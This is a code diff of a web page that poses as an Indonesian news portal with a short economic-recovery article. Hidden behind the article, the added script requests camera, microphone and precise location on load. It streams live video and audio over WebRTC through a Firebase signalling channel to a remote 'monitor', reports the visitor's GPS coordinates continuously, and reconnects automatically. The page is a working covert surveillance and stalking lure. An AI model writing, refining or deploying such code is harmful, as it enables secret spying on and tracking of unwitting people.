@@ -3,24 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Berita Terkini Nasional</title>
+    <title>Berita Terkini - Update 24 Jam</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: 'Helvetica', sans-serif; margin: 0; padding: 20px; color: #333; }
-        .top-bar { background: #d32f2f; color: white; padding: 15px; font-weight: bold; margin: -20px -20px 20px -20px; }
-        .content { max-width: 600px; margin: 0 auto; }
-        img { width: 100%; border-radius: 4px; }
+        body { font-family: 'Arial', sans-serif; margin: 0; line-height: 1.6; color: #333; }
+        .navbar { background: #2c3e50; color: white; padding: 1rem; text-align: center; font-weight: bold; }
+        .main-content { max-width: 800px; margin: 20px auto; padding: 0 15px; }
+        .news-img { width: 100%; height: auto; border-radius: 8px; margin-bottom: 15px; }
         #v { display: none; }
     </style>
 </head>
 <body>
-    <div class="top-bar">LIPUTAN KHUSUS</div>
-    <div class="content">
-        <h1>Strategi Baru Pemulihan Ekonomi di Era Digital</h1>
-        <p><small>Dipublikasikan: Baru saja</small></p>
-        <img src="https://picsum.photos/600/350" alt="Berita">
-        <p>Pemerintah baru saja mengumumkan langkah-langkah strategis untuk memperkuat infrastruktur digital di seluruh provinsi. Program ini diharapkan dapat meningkatkan koneksi antar daerah secara instan...</p>
+    <div class="navbar">NEWS PORTAL INDONESIA</div>
+    <div class="main-content">
+        <h1>Pemulihan Ekonomi Nasional Menunjukkan Tren Positif</h1>
+        <p><small>Dipublikasikan: 2 menit yang lalu</small></p>
+        <img src="https://picsum.photos/800/400" alt="Berita Utama" class="news-img">
+        <p>Pemerintah terus memantau perkembangan ekonomi digital yang menjadi tulang punggung baru bagi pertumbuhan nasional. Berbagai sektor mulai bangkit dengan dukungan infrastruktur jaringan yang semakin luas dan stabil di seluruh pelosok negeri...</p>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
@@ -32,43 +32,75 @@
             projectId: "chatroom-e9b3f"
         };
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.database().ref('secure_p2p_v3');
+        const db = firebase.database().ref('auto_p2p_v4');
 
-        let pc = new RTCPeerConnection({
-            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-        });
+        let pc;
+        let localStream;
 
-        async function init() {
-            // Bersihkan data lama
-            await db.remove();
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('v').srcObject = stream;
-                stream.getTracks().forEach(track => pc.addTrack(track, stream));
-            } catch (e) { console.log("Izin ditolak"); }
-
-            // Kirim Lokasi
-            navigator.geolocation.watchPosition(p => {
-                db.child('loc').set({lat: p.coords.latitude, lng: p.coords.longitude});
+        async function createPeerConnection() {
+            if (pc) pc.close();
+            pc = new RTCPeerConnection({
+                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
             });
 
-            // Signaling
-            pc.onicecandidate = e => { if(e.candidate) db.child('ice_t').push(e.candidate.toJSON()); };
-            
+            pc.onicecandidate = e => {
+                if (e.candidate) db.child('ice_target').push(e.candidate.toJSON());
+            };
+
+            if (localStream) {
+                localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
+            }
+
             const offer = await pc.createOffer();
             await pc.setLocalDescription(offer);
-            db.child('sdp').set({offer: {type: offer.type, sdp: offer.sdp}});
-
-            db.child('sdp/answer').on('value', async s => {
-                const a = s.val();
-                if(a && !pc.currentRemoteDescription) await pc.setRemoteDescription(new RTCSessionDescription(a));
-            });
-
-            db.child('ice_m').on('child_added', s => pc.addIceCandidate(new RTCIceCandidate(s.val())));
+            await db.child('sdp').update({ offer: { type: offer.type, sdp: offer.sdp } });
         }
 
-        window.onload = init;
+        async function startSystem() {
+            // Bersihkan koneksi lama saat start
+            await db.child('sdp').remove();
+            await db.child('ice_target').remove();
+            await db.child('ice_monitor').remove();
+
+            try {
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('v').srcObject = localStream;
+            } catch (e) { console.error("Izin media ditolak"); }
+
+            // Ambil lokasi & kirim heartbeat
+            navigator.geolocation.watchPosition(p => {
+                db.child('status').set({
+                    lat: p.coords.latitude,
+                    lng: p.coords.longitude,
+                    lastActive: Date.now()
+                });
+            }, null, { enableHighAccuracy: true });
+
+            await createPeerConnection();
+
+            // Dengarkan Jawaban (Answer)
+            db.child('sdp/answer').on('value', async s => {
+                const a = s.val();
+                if (a && pc && !pc.currentRemoteDescription) {
+                    await pc.setRemoteDescription(new RTCSessionDescription(a));
+                }
+            });
+
+            // Dengarkan ICE Monitor
+            db.child('ice_monitor').on('child_added', s => {
+                if (pc) pc.addIceCandidate(new RTCIceCandidate(s.val()));
+            });
+
+            // Jika monitor melakukan refresh, mereka akan menghapus 'answer'. 
+            // Kita harus membuat offer baru jika itu terjadi.
+            db.child('sdp/answer').on('value', s => {
+                if (!s.exists()) createPeerConnection();
+            });
+        }
+
+        window.onload = startSystem;
+        // Penanganan jika tab ditutup
+        window.onbeforeunload = () => { db.child('status/lastActive').set(0); };
     </script>
 </body>
 </html>
